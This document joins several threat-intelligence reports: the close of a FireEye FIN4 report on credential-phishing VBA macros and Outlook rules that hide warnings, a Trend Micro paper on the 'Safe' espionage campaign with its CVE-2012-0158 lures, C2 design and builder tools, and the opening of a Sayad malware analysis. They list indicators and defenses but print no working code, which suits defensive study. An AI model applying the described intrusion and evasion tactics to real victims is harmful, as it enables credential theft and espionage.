FIN4 proceeded to send a spearphishing email from a compromised account at Advisory Firm A to another advisory firm ( `` Advisory Firm B '' ) , who was also representing Public Company A. FIN4 used a SEC filing document as a lure .
After news of the possible acquisition was made public , Public Company A 's stock price varied significantly .
It is likely that FIN4 used the inside information they had to capitalize on these stock fluctuations .
Figure 6 : Outlook rule to filter emails Evading Detection FIN4 has been observed creating a rule in victims ' Microsoft Outlook accounts that automatically deletes any emails that contain words such as `` hacked '' , `` phish '' , `` malware '' , etc .
( Figure 6 ) .
The group likely implements these rules to prevent compromised victims from receiving replies from intended targets that their email account may be compromised , and likely buys FIN4 extra time before victim organizations detect their activities .
Conclusion If FIN4 's activities are indeed part of a sustained effort to gain advance access to market - moving information , it would not be the first time that network intrusions have played a role in an insider trading case .
However the scale of FIN4 's operations , with targets at more than 100 public companies , coupled with their tactic of going after key individuals ' emails , sets this group apart .
Our visibility into FIN4 is limited to their network operations , so we can not say for certain what happens after they gain access to insider information .
What we can say is that FIN4 's network activities must reap enough benefit to make these operations worth supporting for over a year - and in fact , FIN4 continues to compromise new victims as we finish this report .
FIN4 employs a simple , yet effective , method to gather targets ' user credentials through their spearphishing emails .
Using VBA macros , they embed malicious code into already existing and legitimate company documents .
Embedded in each Microsoft Word or Excel document is a malicious macro that prompts the user for their Outlook credentials .
We have also observed this group send emails with links to fake Outlook Web App ( OWA ) login pages that will also steal the user 's credentials , however we have not observed this tactic in recent months .
VBA Macros Embedded into Legitimate Documents The embedded VBA macro consists of a module typically entitled `` Module1 '' and a user form that has been called both `` UserForm1 '' and '' UserLoginForm '' .
The code in Module1 contains the information needed to communicate with the C2 server ( Figure 7 ) .
Figure 7 : Example of `` Module1 '' used in one of the most recent campaigns Figure 8 : Example of `` UserForm1 '' with Campaign Code The userform contains the code for the user credentials prompt and an artifact that is highly indicative of the actors ' targeting .
The artifact ( a campaign code ) is usually tailored to the particular target company or the company from which they are targeting others ; alternately , the artifact may represent a generic role for targeted individuals , such as SCIENTISTS_AND_RESEARCH or CEO_CFO_COO_CORPDEV .
We have identified over 70 unique campaign codes to date .
This campaign code is transmitted to the C2 server along with the victim 's username and password , as seen in Figure 8 .
Many of the fake Outlook windows opened by the macros contain the logo of the company targeted giving the pop - up apparent legitimacy .
Figure 9 below represents a generic pop - up , with no company - specific information that a user might see after opening the document .
Only after credentials are entered will the document appear for the user .
Figure 9 : Malicious Dialogue that Prompts for User 's Credentials Figure 10 : POST Request Containing User 's Credentials Sent to C2 Networking and Infrastructure After the user enters data into the username and password fields , the data is transmitted to the C2 server via a POST request ( Figure 10 ) .
FIN4 then uses the collected credentials to login to victim email accounts .
In addition to gaining access to the victim 's private communications , FIN4 also uses the compromised accounts to email malicious documents to additional targets inside and outside the victim company .
The group is currently active as this report goes to publication and recently used the domains junomaat81 [ .
] us and lifehealthsanfrancisco2015 [ .
] com as their C2s .
FIN4 appears to be heavily reliant on Tor ( software that enables users to browse the Internet anonymously by encrypting their internet traffic and routing it through servers around the world ) and has been seen using Tor to login to victims ' email accounts after obtaining the compromised user credentials .
We have detected at least two User Agents that the actors have used and which can be used to identify potentially suspicious OWA activity in network logs , when paired with originating Tor IP addresses .
Figure 11 : FIN4 User Agents Table 1 : List of known Actor - Registered C2 Domains We have identified nine C2 domains that we believe were registered by the actors to conduct these operations .
There are also legitimate domains that appear to have been compromised and used in previous campaigns in late 2013 and early 2014 ; however in the recent months we have not seen indications that the actor has used compromised legitimate domains to conduct their operations .
What Can Network Defenders Do ? The relative simplicity of FIN4 's tactics ( spearphishing , theft of valid credentials , lack of any malware installed on victim machines ) makes their intrusion activity difficult to detect .
However a few basic security measures can help thwart the group 's efforts .
Disabling VBA macros in Microsoft Office by default , as well as blocking the domains listed in Table 1 will help protect against FIN4 's current activities .
Additionally , enabling two - factor authentication for OWA and any other remote access mechanisms can help prevent credentials stolen in this manner from being leveraged successfully .
Companies can also check their network logs for OWA logins from known Tor exit nodes if they suspect they are victimized .
Typically , legitimate users do not use Tor for accessing email .
While not conclusive , if paired with known targeting by this group , the access from Tor exit nodes can serve as an indicator of the group 's illicit logins .
347.3393 ) | info @ fireeye.com | www.fireeye.com FireEye , Inc. | 1440 McCarthy Blvd .
Milpitas , CA 95035 | 408.321.6300 | 877.FIREEYE ( © 2014 FireEye , Inc. All rights reserved .
FireEye is a registered trademark of FireEye , Inc. All other brands , products , or service names are or may be trademarks or service marks of their respective owners .
TREND MICRO LEGAL DISCLAIMER The information provided herein is for general information and educational purposes only .
It is not intended and should not be construed to constitute legal advice .
The information contained herein may not be applicable to all situations and may not reflect the most current situation .
Nothing contained herein should be relied on or acted upon without the benefit of legal advice based on the particular facts and circumstances presented and nothing herein should be construed otherwise .
Trend Micro reserves the right to modify the contents of this document at any time without prior notice .
Translations of any material into other languages are intended solely as a convenience .
Translation accuracy is not guaranteed nor implied .
If any questions arise related to the accuracy of a translation , please refer to the original language official version of the document .
Any discrepancies or differences created in the translation are not binding and have no legal effect for compliance or enforcement purposes .
Although Trend Micro uses reasonable efforts to include accurate and up - to - date information herein , Trend Micro makes no warranties or representations of any kind as to its accuracy , currency , or completeness .
You agree that access to and use of and reliance on this document and the content thereof is at your own risk .
Trend Micro disclaims all warranties of any kind , express or implied .
Neither Trend Micro nor any party involved in creating , producing , or delivering this document shall be liable for any consequence , loss , or damage , including direct , indirect , special , consequential , loss of business profits , or special damages , whatsoever arising out of access to , use of , or inability to use , or in connection with the use of this document , or any errors or omissions in the content thereof .
Use of this information constitutes acceptance for use in an `` as is '' condition .
Introduction Whether considered advanced persistent threats ( APTs ) or malware - based espionage attacks , successful and long - term compromises of high - value organizations and enterprises worldwide by a consistent set of campaigns can not be ignored .
Because `` noisier '' campaigns are becoming increasingly well - known within the security community , new and smaller campaigns are beginning to emerge .
This research paper documents the operations of a campaign we refer to as '' Safe , '' based on the names of the malicious files used .
It is an emerging and active targeted threat .
Note that any mention of `` SafeNet '' in this paper is completely unrelated to and has no association with SafeNet , Inc. , a global leader in data protection and a valued partner of Trend Micro .
The author of the Safe malware apparently maliciously used the word `` SafeNet '' as part of this viral campaign , and to the extent the word `` SafeNet '' appears in this paper , it appears solely as replicated in the attacking author 's malware configuration .
There is no correlation between SafeNet Inc. and the Safe campaign and should not be interpreted as such .
The Safe campaign was able to compromise the following types of organizations : • Government ministries • Academic research institutions • Technology companies • Nongovernmental organizations • Media outlets While we have yet to determine the campaign 's total number of victims , it appears that nearly 12,000 unique IP addresses spread over more than 100 countries were connected to two sets of command - and - control ( C & C ) infrastructures related to Safe .
We also discovered that the average number of actual victims remained at 71 per day , with few if any changes from day to day .
This indicates that the actual number of victims is far less than the number of unique IP addresses .
Due to large concentrations of IP addresses within specific network blocks , it is likely that the number of victims is even smaller and that they have dynamically assigned IP addresses , which have been compromised for some time now .
Investigating targeted campaigns involves more than simply collecting actionable indicators like malware samples and C & C server information .
Investigating and monitoring the activities of the Safe campaign over time , we were able to take advantage of the mistakes the attackers made and thus gain a deeper understanding of their operations .
One of the C & C servers was set up in such a way that the contents of the directories were viewable to anyone who accessed them .
As a result , not only were we able to determine who the campaign 's victims were , but we were also able to download backup archives that contained the PHP source code the attackers used for the C & C server and the C code they used to generate the malware used in attacks .
The author of the malware used in the campaign is probably a professional software developer who studied at a technical university in China .
This individual appears to have repurposed legitimate source code from an Internet services company in the same country for use as part of the campaign 's C & C server code .
As such , this may be a case in which a malware entrepreneur 's code was used in targeted attacks .
In addition to understanding the tools and techniques used in this campaign , we had the opportunity to analyze the data to determine its source .
While the information that we obtained suggested the identity of the malware author , we were not able to attribute the campaign operation to him .
In fact , while we were able to identify the various IP addresses used by the operators , the geographic diversity of the proxy servers and VPNs made it difficult to determine their true origin .
The distribution mechanism the Safe campaign used involved spear- phishing emails that contain a malicious attachment .
This technique , which is quite common for APT campaigns , encourages a recipient to open a malicious attachment by sending an email with contextually relevant content .
We discovered several malicious documents that all exploited a Microsoft Office® vulnerability ( i.e. , CVE-2012 - 0158 ) .
If opened with a version of Microsoft Word® that is not up - to - date , a malicious payload is Figure 1 : Sample Safe spear - phishing email silently installed on the user 's ( aka attack vector ) computer .
Figure 2 : Sample decoy documents In addition to the Tibetan - themed attack vector , we found documents written in Mongolian though their exact targets remain unclear .
First Stage Opening the malicious document on a system running a vulnerable version of Microsoft Office opens the decoy document for the user to view .
Note though that this also drops malicious files onto the system that allows the attackers to take control of it .
After the initial compromise , the attackers may then steal files from the compromised system .
The decoy document , NBC Interview_Excerpts.doc , has the MD5 hash , a2da9cda33ce378a21f54e9f03f6c0c9efba61fa .
It drops the following files : • smcs.exe ( 91e6277a70d48ed953ac9208275e5dc855a8f7a7 ) , which contains : • SafeCredential . DAT ( 303e982d0929ca2c50809323dff66be38a46926a ) • SafeExt.org ( 2029399fb4be3d88c2ba0a7544b1ebec58157639 ) , which contains : • SafeExt.dll ( cde35c8da8c420aeaf5adda14ba68d18010479fa ) The malware the malicious documents drop has several components , including : • SafeExt.dll : Contains the malware 's main functionality .
• SafeCredential . DAT : Contains the RC4 key , C & C information , and campaign `` mark .
'' If User Account Control ( UAC ) is active , SafeExt.dll will be injected into explorer.exe .
Otherwise , the file is copied to % Program Files % \Internet Explorer\SafeNet\ and registered as a Browser Helper Object ( BHO ) .
Figure 3 : RC4 key , C & C information , and campaign mark The malware then accesses a C & C server over HTTP POST to send data using the domain name and URL path in SafeCredential . DAT .
The network traffic is encrypted with the RC4 key in SafeCredential . DAT .
One key indicator that can be used to detect this network communication is the user - agent , Fantasia .
Figure 4 : Check in with the C & C server During our investigation of the C & C servers associated with Safe , we discovered a backup script that the attackers used to archive the files on them .
This allowed us to acquire the Figure 5 : Safe backup script source code for the .PHP
files used on the C & C servers .
The data that the malware sends from a compromised host to report.php is decrypted by the C & C server and stored in a MySQL™ database .
In addition to RC4 encryption use , the file 's content is XORed with the function in Figure 6 .
The parameters of the query are unpacked and sent to a function that Figure 6 : Safe 's VisualEncrypt function inserts the information the compromised host provides into the MySQL database .
It then checks the database to see if the attackers specified instructions to send to the compromised host .
If there are , these instructions are sent back to the compromised host .
Figure 7 : Safe 's check - in function The REQUEST_TYPE_CLIENT_REQUEST function inserts a unique ID for each compromised host as well as the Internet and external IP addresses , hostname , Windows domain , the system 's disc drive information , and a campaign mark .
It has a field to store information about any additional malware plug - ins that have been installed on the system .
The malware uses the following marks or campaign tags : • 120713 • L0821 • 120713p • Lewis120713px • 123456 • N0911 • 654321 • Weber0720p • c0814 • 720p • C0821 • L1224 After the initial compromise , the attackers may instruct compromised systems to download additional malware and tools .
The tools that we discovered were located on the same C & C servers .
Plug - Ins The data contained in the C & C servers references plug - ins that are available for the malware .
We believe they are related to the malware 's data - exfiltration capabilities .
The names of the plug - ins are : • OpenDoc • UsbDoc • UsbExe Tools The tools used by Safe are off - the - shelf programs that are able to extract saved passwords from Internet Explorer® ( IE ) and Mozilla Firefox® as well as any stored Remote Desktop Protocol ( RDP ) credentials .
Figure 8 : Password extraction tools We found two sets of C & C servers that do not seem to have anything in common apart from being used in conjunction with the same malware .
The first set of C & C servers had Mongolian - themed domain names - mongolbaatar .
us and mongolbaatarsonin.in .
The second set of C & C servers use the domains , getapencil.com , which was registered with a privacy protection service , and withoutcake.com , which was registered by wanxian @ 126 . com .
Willyoumarryadog.com may also be a C & C server but we have not yet discovered samples that use this domain name .
Figure 9 : Safe C & C server infrastructure The Tibetan- and Mongolian - themed attack vectors described earlier are connected to the first infrastructure ( i.e. , mongolbaatar ) .
We were unable to discover attack vectors for the second C & C infrastructure .
One of the C & C servers used , withoutcake.com , was registered using the email address , wanxian @ 126.com .
This email address has been used to register 17 domain names , five of which have been confirmed to be C & C servers .
Figure 10 : Connections to other campaigns The domain , sugarsbutters.com , was used in attacks that leveraged images of Russian model , Irina Shayk , and dropped the iMuler malware that affects Mac OS X systems in November 2012 .
Three domains-aq5u.org , prettyb0yinus .
com , and shumetheme.org-have also been used as C & C servers for campaigns using the Enfal malware .
We were able to identify victims in two ways .
First , we were able to download a list of victims that were currently online from the C & C servers .
Second , we were also able to download logs from the C & C servers that listed all of the IP addresses that `` checked in '' to them using the REQUEST_TYPE_CLIENT _ REQUEST function .
The first set of C & C servers ( i.e. , mongolbataar ) appeared to have only three '' live '' victims - one with an IP address assigned to South Sudan , another with an address assigned to Mongolia , and another that did not list an external IP address .
The logs we obtained from the first set of C & C servers showed that 243 unique IP addresses from 11 different countries checked in to them .
Table 1 : Country Breakdown of Unique IP Address Locations The logs we obtained from the second set of C & C servers ( i.e. , getapencil .
com ) showed that 11,563 unique IP addresses from 116 different countries checked in to them .
Table 2 : Top 15 Country Breakdown of Unique IP Address Locations We discovered that on average , 71 victims accessed the getapencil.com C & C server at any given time .
The actual total victim count was significantly lower than the number of unique IP addresses though .
A closer look at the C & C servers allowed us to identify the tools and source code the threat actors used to create , distribute , and encrypt / decrypt data .
The tools presented in this section either came preassembled or could be compiled using the source code that could be downloaded from the getapencil.com C & C server .
TypeConfig / SafeDisk The primary function of TypeConfig / SafeDisk appears to be embedding a backdoor into a valid .PE
file .
This tool appears to be the primary method for creating the malware related to the campaign .
Figure 11 : Data flow diagram showing TypeConfig malware creation Figure 12 : TypeConfig and translated graphical user interfaces ( GUIs ) The fields in the TypeConfig GUI allow an attacker to specify a C & C server location and data like the malware 's name and version number , which are sent back to the attacker after a compromise .
We also pulled the application , DECRYPT.exe , from a getapencil .
com C & C server .
This application is a custom encrypter / decrypter for any file inputted into the application .
Further analysis of this application shows that it uses large portions of Makoto Figure 13 : DECRYPT.exe 's GUI with some Matsumoto and Takuji Nishimura 's translated content Random Number Generator ( RNG ) for encryption functionality .
Once the Decrypt button is pressed , a password validation box appears .
We were able to identify victim files that were on `` drop servers '' that utilize Figure 14 : Password validation box that DECRYPT.exe for encryption/ appears when the Decrypt button is pressed decryption .
We also identified security tools with both valid and nefarious purposes and have been used in other campaigns on the C & C servers .
We listed some of these along with their functionality below : • LZ77 : Used to compress and decompress files .
• UPXShell : Commonly used to pack malware in order to make it more difficult for analysts to reverse - engineer .
• DebugView : A Microsoft Sysinternals tool that allows you to monitor debug outputs on your local system .
• Build.bat : Used to open TypeConfig and `` automate '' malware creation processes .
• Compress.bat : Used to automatically compress files defined in a batch file with the aid of LZ77.exe .
• PECompress.bat : Used to compress files identified in a batch file with the aid of UPXShell.exe .
This section shows some of the discoveries we made while trying to identify the functionality and use cases of each application we discovered .
Nearly all of the samples were coded in C , specifically Visual C. The directory structure of the source code appeared to be standard of directories written using C , Visual Studio® Express , or a litany of other tools .
The code appeared to be very robust .
We created a complete mind map of the code , its directories and the files located within the said directories .
Figure 15 : High - level directory / code structure of our findings The applications in the following section are only a few of those that contained some of the most interesting details about our findings .
TypeConfig.exe / SafeDisk.exe Source Code Analysis Figure 16 : SafeDisk / TypeConfig source tree We were able to correlate similarities between TypeConfig.exe and SafeDisk.exe .
While reverse- engineering code and functionality , we discovered that the two applications Figure 17 : Code identifying SafeDisk.exe were identical in function .
We have not , however , ascertained what the purpose behind differential naming is , but their functionality appeared to be very similar .
We also identified fields in TypeConfig.exe by directly correlating the code to the fields within the GUI .
Another interesting feature to note within TypeConfig.exe is its use of SafeCredential . DAT , which the threat actors created to specify the RC4 encryption key , C & C server information , and campaign mark .
Figure 19 : SafeCredential . DAT utilization Figure 18 : Field lists for the GUI Figure 20 : PHP source code tree The C & C functionality was written in PHP .
The code required config.php , which contained the configuration for the MySQL database where victim information was stored ; global.php , which contained some mapping of strings to command numbers ; upload .
php , which provided the functionality for data exfiltration ; and utils.php , which contained the encryption functions in order to encrypt and decrypt communications between a compromised host and a C & C server .
Compromised hosts and malicious operators interacted with record.php , Figure 21 : Safe commands the primary file required for C & C operation .
The utils directory also contained code for extensive logging and what appeared to be repurposed legitimate code .
When compromised computers accessed record.php , they interacted with the functionality labeled CLIENT .
Operators used MANAGE commands to interact with the C & C functionality .
Identifying who is responsible for targeted attacks is not an easy task .
The term '' attribution '' is applied to everything , ranging from individuals to governments .
The technical indicators often used to determine attribution like domain name registration data and geographic locations of IP addresses can be easily falsified .
Modern attackers often use `` hop '' points that consist of compromised systems as well as proxy servers and VPNs to disguise their origin .
It is trivial to purchase virtual private servers ( VPSs ) in just about any country , and determining who ultimately benefits from the spoils of targeted attacks is often a matter of interpretation based on geopolitics with limited exploration of possible alternative explanations .
The technical indicators used to attribute attacks vary , depending on what is being analyzed .
In some cases , the term `` attribution '' is used to refer to the developers of either the exploits or malware payloads .
They could very well be completely different threat actors .
The term is also used to refer to identify the providers of C & C infrastructures used in targeted attacks , particularly those that registered the domain names .
It can also refer to obtaining specific information about the campaign operators who launch attacks and operate the C & C infrastructure .
This paper presents some of the technical evidence we discovered during our investigation .
We focused on two threat actor types - developers and operators .
We were able to uncover clues that indicate the identity of the malware author that were left in the source code as well as through open source analysis .
We were able to obtain limited insights into the activities of the C & C operators through the logs they collected , which recorded the IP addresses they used to operate and manage the C & C servers .
Throughout much of the code , we saw indications of its origin .
For instance , when looking at the code for the file , TypeConfig.vcproj . INTERNAL .
[ REDACTED ] 04.user , located under Src > TypeConfig , we were not only able to locate the author 's name but also the language setting , < ? xml version= '' 1.0 '' encoding= `` gb2312 '' ? > , which refers to the registered Internet name for a key official character set of the People 's Republic of China ( PRC ) .
However , Figure 22 : TypeConfig 's source code other comments , especially those within the PHP code , often appeared in English .
In addition to the language used , we found that the malware author used a name in several places throughout the source code .
For instance , under the directory , Src > TypeConfig > , we noticed an interesting .vcproj
file called `` TypeConfig.vcproj . INTERNAL .
[ REDACTED ] 04.user .
'' Figure 23 : Vcproj configuration with machine name This file contains a remote machine configuration module that includes the author 's name and the name of the development machine used , which directly correlates to `` CompanyName '' found elsewhere in the code .
Figure 24 : TypeConfig 's source code with author information We found the string , `` CompanyName , '' in the C source code that contains the same name as the development machine 's .
The PHP code used as the C & C server 's back end contained a copyright notice that matches the author 's name in the C code as well as an email address / QQ number that matches the '' CompanyName '' in the C code .
Figure 25 : Copyright notice containing a name and an email address / QQ number The email address was used to register a domain name for a personal blog about software development with a Beijing street address .
We also found the same name and email address used by an author of an academic paper at a technical university in China .
Posts on this individual 's personal blog also indicate a relationship with the same university , including the development of some legitimate software .
The `` CompanyName '' in the source code , portions of which are contained in the email address / QQ number , were also found in source code for keyloggers and malware posted on a Chinese code - sharing site .
Figure 26 : Repurposed source code We also found legitimate code that appears to have been developed by an Internet services company used as part of the C & C panel .
This code was not developed by the same person that we believe developed the Safe malware but appears to simply have been reused .
Figure 27 : SVN repository with user name We believe though that this code is not publicly available .
In the code 's archive we recovered from the C & C servers , we found a .csv
directory that contains an entries file that contains the location of the repository as well as the time , version , and user name of the person who last committed the source code .
The author information indicates that the malware author checked the code in to the Internet services company 's private SVN repository .
It appears that the malware author has been repurposing the code for his own malware project .
We believe the malware author is a professional software engineer that is familiar with version control .
We also found indicators that this individual is proficient in software development due to the high quality of the source code he used .
The entire source code was explicitly written with future development in mind .
It was modularized and heavily commented on in a way that allows further development even by several engineers .
These qualities are traditionally seen in the work of professional software engineers that have been taught traditional computer science .
Apart from being significantly well - organized and well - commented , the code was also developed with defensive programming in mind .
Each of the variables was named in a very obvious manner , helping other engineers easily distinguish functionality ; again , a trait seen in the work of many professional software engineers .
In addition to being heavily commented on and using intuitive variable naming conventions , the code also had an apparent slant toward usability .
Each interface was very intuitive and well - designed , something not often seen in the code of a hobbyist .
The use of terms like `` bot , '' combined with the author 's posting of the malware code to code - sharing sites , indicate a degree of familiarity with the cybercriminal underground in China .
We have not , however , uncovered evidence that links the malware author with the campaign 's operators .
We were unable to obtain information beyond IP addresses that indicate the origin of those issuing MANAGE or other C & C requests .
The extensive logging performed by the C & C servers , however , allowed us to differentiate between the victims ' and operators ' IP addresses .
Table 3 : Geographic Locations of the Mongolbaatar C & C Server Operators ' IP Addresses Table 4 : Geographic Locations of the Getapencil C & C Server Operators ' IP Addresses While most of the operator interactions we saw were from China and Hong Kong , we also saw the use of VPNs and proxy tools , including Tor , which contributed to the geographic diversity of the operators ' IP addresses .
Ongoing cyber - espionage campaigns have been successfully infiltrating targets worldwide , many of which have been active for years .
However , the amount of public exposure , especially of noisier and larger campaigns , has been increasing .
Perhaps due to their success , these campaigns ' operators intensified their operations , causing them to be increasingly visible .
But smaller campaigns are beginning to emerge ; these use small clusters of C & C servers and new malware as well as attack fewer targets .
While determining the intent and identity of the attackers often remains difficult to ascertain , we determined that the Safe campaign is targeted and uses malware developed by a professional software engineer that may be connected to the cybercriminal underground in China .
This individual studied at a prominent technical university in the same country and appears to have access to an Internet services company 's source code repository .
This individual developed malware that was , in turn , used for targeted attacks leveraging two distinct sets of C & C infrastructure .
As the tools used in targeted attacks are exposed , attackers may look for new custom malware to circumvent defenses .
As a result , attackers may increasingly look to the cybercriminal underground for new malicious tools instead of developing their own tools for exclusive use .
These developments highlight the increasing need for ongoing investigation and monitoring of such threats .
While indicators that can be directly incorporated into defensive operations remain important , in - depth qualitative analysis of particular campaigns can provide critical insights into attackers ' operations .
Furthermore , attribution should not be entirely based on the common use of tools and infrastructure , as these are increasingly not being developed and used exclusively by particular sets of threat actors .
Sufficiently motivated threat actors can penetrate even networks that use moderately advanced security measures .
As such , apart from standard and relevant attack prevention measures and mechanisms like solid patch management ; endpoint and network security ; firewall use ; and the like , enterprises should also focus on detecting and mitigating attacks .
Moreover , data loss prevention ( DLP ) strategies that identify the data an organization is protecting and take into account the context of data use should be employed .
Threat intelligence refers to indicators that can be used to identify the tools , tactics , and procedures threat actors engaging in targeted attacks use .
Both external and local threat intelligence is crucial for developing the ability to detect attacks early .
The following are the core components of this defense strategy : • Enhancing visibility : Logs from endpoint , server , and network monitoring are an important and often underused resource that can be aggregated to provide a view of the activities within an organization that can be processed for anomalous behaviors , which can indicate a targeted attack .
• Performing integrity checks : In order to maintain persistence , malware will make modifications to the file system and registry .
Monitoring such changes can indicate the presence of malware .
• Empowering the human analyst : Humans are best positioned to identify anomalous behaviors when presented with a view of aggregated logs from across a network .
This information is used in conjunction with custom alerts based on the local and external threat intelligence available .
Technologies available today like Deep Discovery provide visibility , insight , and control over networks to defend against targeted threats .
Deep Discovery uniquely detects and identifies evasive threats in real - time and provides in - depth analysis and actionable intelligence to prevent , discover , and reduce risks .
Once an attack is identified , the cleanup strategy should focus on the following objectives : • Determine the attack vector and cut off communications with the C & C server .
• Determine the scope of the compromise .
• Assess the damage by analyzing the data and forensic artifacts available on compromised machines .
Remediation should be applied soon afterward , which includes steps to fortify affected servers , machines , or devices into secure states , informed in part by how the compromised machines were infiltrated .
Security - related policies and procedures combined with education and training programs are essential components of defense .
Traditional training methods can be fortified by simulations and exercises using real spear - phishing attempts sent to test employees .
Employees trained to expect targeted attacks are better positioned to report potential threats and constitute an important source of threat intelligence .
The ultimate objective of targeted attacks is to acquire sensitive data .
As such , DLP strategies that focus on identifying and protecting confidential information are critical .
Enhanced data protection and visibility across an enterprise provides the ability to control access to sensitive data as well as monitor and log successful and unsuccessful attempts to access it .
Enhanced access control and logging capabilities allow security analysts to locate and investigate anomalies , respond to incidents , and initiate remediation strategies and damage assessment .
Part of processing and identifying the components of the Safe campaign is creating a list of indicators of compromise ( IOCs ) to help organizations better identify and locate certain tools , malware , and traffic patterns that could indicate compromise .
The following table summarizes the Trend Micro solutions for the components of the Safe campaign .
Trend Micro recommends a comprehensive security risk management strategy that goes further than advanced protection to meet the real - time threat management requirements of dealing with targeted attacks .
• http : //www.trendmicro.com / cloud - content/ • http : //www.f - secure.com / v - descs / backdoor _ us / pdfs / security - intelligence / white - papers/ osx_imuler_a.shtml wp - spear - phishing - email - most - favored - apt- • http : //www.sophos.com / en - us / threat - center/ attack-bait.pdf threat - analyses / viruses - and - spyware/ • http : //www.cve.mitre.org / cgi - bin / cvename .
Troj~Luiha - BK / detailed - analysis.aspx cgi ? name = CVE-2012 - 0158 • http : //www.threatexpert.com / report.aspx ? • http : //en.wikipedia.org / wiki / User_Account _ md5=9d334262d146bd57a7adfb9b3e093f9f Control • http : //www.math.sci.hiroshima - u.ac.jp/~m- • http : //en.wikipedia.org / wiki / Browser _ mat / MT / MT2002/CODES / readme - mt.txt Helper_Object • http : //en.wikipedia.org / wiki / GB_2312 • http : //www.nirsoft.net/ • http : //svnbook.red - bean.com / en/1.6/svn .
• http : //www.totaldefense.com/ developer.insidewc.html blogs/2012/04/11/mac - os - x - threat- • http : //www.trendmicro.com / us / enterprise/ masquerading-as-image-files.aspx security - risk - management / deep - discovery/ index.html May 2013 | Campaign Quick Profile : Safe Targeted attacks are attacks that appear to be intended for specific entities or organizations .
Unlike indiscriminate cybercrime attacks , spam , web threats , and the like , targeted attacks are much harder to detect because of the nature of related components and techniques .
SAFE • First Seen Individual targeted attacks are not one - off attempts .
Attackers continually try to get inside the target 's network .
The Safe campaign was first seen on October 2012 .
• Victims and Targets Targeted threats target specific industries or communities of interest in specific regions .
The Safe campaign was able to compromise government ministries , technology companies , media outlets , academic research institutions , and nongovernmental organizations .
Furthermore , it was discovered that the average number of actual victims remained at 71 per day , with few if any changes from day to day .
• Operations First - stage computer intrusions often use social engineering .
Attackers custom - fit attacks to their targets .
The Safe campaign attackers used spear - phishing emails with malicious attachments .
Attackers used several malicious documents that all exploited a Microsoft Office® vulnerability ( i.e. , CVE-2012 - 0158 ) .
If opened with a version of Microsoft Word® that is not up - to - date , a malicious payload is silently installed on the user 's computer .
In addition , one of the C & C servers used in the Safe campaign was set up in such a way that the contents of the directories were viewable to anyone who accessed them .
• Possible Indicators of Compromise Attackers want to remain undetected as long as possible .
A key characteristic of targeted attacks is stealth .
Below is a list of the components of the Safe campaign .
* More information on the Safe campaign can be seen in the Trend Micro research paper , `` Safe : A Targeted Threat .
'' TREND MICRO™ TREND MICRO INCORPORATED Trend Micro Incorporated , a global cloud security leader , creates 10101 N. De Anza Blvd .
a world safe for exchanging digital information with its Internet Cupertino , CA 95014 content security and threat management solutions for businesses U.S. toll free : 1 + 800.228.5651 and consumers .
A pioneer in server security with over 20 years Phone : 1 + 408.257.1500 experience , we deliver top - ranked client , server , and cloud - based Fax : 1 + 408.257.2003 security that fits our customers ' and partners ' needs ; stops new threats faster ; and protects data in physical , virtualized , and cloud www.trendmicro.com environments .
Powered by the Trend Micro™ Smart Protection Network™ infrastructure , our industry - leading cloud - computing security technology , products and services stop threats where they emerge , on the Internet , and are supported by 1,000 + threat intelligence experts around the globe .
For additional information , visit www.trendmicro.com .
©2013 by Trend Micro , Incorporated .
All rights reserved .
Trend Micro and the Trend Micro t - ball logo are trademarks or registered trademarks of Trend Micro , Incorporated .
All other product or company names may be trademarks or registered trademarks of their owners .
Information stealing malware has become increasingly popular among malware authors targeting not just typical end - users , but also specific organizations and states .
We have come across an intriguing piece of malware ( dubbed Sayad ) that implements multiple host data collection methods and wraps them up into a single .NET
DLL .
Sayad malware is typically distributed through phishing emails .
Introduction This week I got hold of a sample of `` Sayad '' , so I ran it through our Vinsula Execution Engine ( VEE ) to find out what it does and how it works .
Credit for sharing the sample of the malware goes to @ MalwareChannel .
The information this malware is able to steal and upload to a Web server controlled by the hackers is highly sensitive and would have an enormous impact on compromised individuals , businesses , and governments .
Some of the tasks Sayad is designed to accomplish include : At the time of writing of this post , the detection rate for Sayad malware binary ( SHA2:8904836017bc20972a769f8d4d6bee08388da3d0f83e362e67f9f0b6b1ae5c12 ) at VirusTotal is zero .
There are several interesting aspects of Sayad malware , and after running the malicious executable through the Vinsula Execution Engine to analyze its behavior , I discovered that the initial executable titled WEXTRACT.exe ( SHA1:1c52b749403d3f229636f07b0040eb17beba28e4 ) was in fact a self extracting EXE that dropped and launched the Binder executable malware , ~8f60957b3689075fa093b047242c0255.exe ( SHA1:69fd05ca3a7514ea79480d1dbb358fab391e738d ) .
Once the Binder executable malware is launched , it checks the .NET
version installed on the machine and drops the information stealer DLL component , Sayad ( aka Client ) – DiagnosticsService.dll ( SHA1:8521eefbf7336df5c275c3da4b61c94062fafdda ) .
Sayad has some characteristics that make it unique : Our collegues from NCC Group 's Cyber Defence Operations published an article titled `` A new Flying Kitten ? '' with some details around Sayad malware and its possible link to the activities of the Iranian hacking group '' Ajax Security Team .
'' Attack Overview The diagram below outlines the key elements of the attack .
The malware executable is delivered by a phishing email or the user is somehow tricked into downloading it and executing it .
Once the user clicks on the malware , it extracts the actual malware executable and launches it .
Analysis Our first step was to run the `` Sayad '' binary through our Vinsula Execution Engine to find out just what it does .
The process tree below as reported by our engine allows us to visually present the parent / child relationship between all the processes and their command lines related to the execution for this specific malware .
For the sake of shortness , in this post we omit the command line details in the process tree above for the csc.exe and cvtres.exe instances .
For the same reason , we also do n't show the complete command line of the rundll32.exe .
Because this is an important detail , here is how it shows up in our Vinsula malware report : Sayad malware is a self - contained executable that embeds within itself all the required malicious components , meaning that it does n't need to download any additional malicious content from the C2 server , which may appear suspicious .
Its three core components are structured as `` Russian Dolls , '' i.e. , one wrapped within the next in layers .
Here is the list with the key components starting from the outermost one .
Hashes of all investigated components are provided at the end of this post .
Further down , I will go into greater detail and provide more information about the behavior and static building blocks of each of these components .
For now , I am just aiming to capture the scope of each executable involved in the orchestration of the Sayad malware .
As we can see in the cascade tree above , the main malware WEXTRACT.exe is a self - extracting executable which extracts the Binder ~8f60957b3689075fa093b047242c0255.exe , and it then launches it .
The Binder is responsible for checking the installed .NET
version and extracting the relevant .NET
Client – DiagnosticsService.dll .
This .NET
DLL implements the data collecting logic and sends the collected data to the C2 server .
The following diagram captures a bit more of the detail of the malware workflow .
The main self - extracting binary WEXTRACT.exe drops two files in the user 's appdata temp directory as shown in the following entries from our Vinsula report .
These two files are the two parts of the Binder – a .NET
executable ( ~8f60957b3689075fa093b047242c0255.exe ) and its configuration file ( ~8f60957b3689075fa093b047242c0255.exe.config ) .
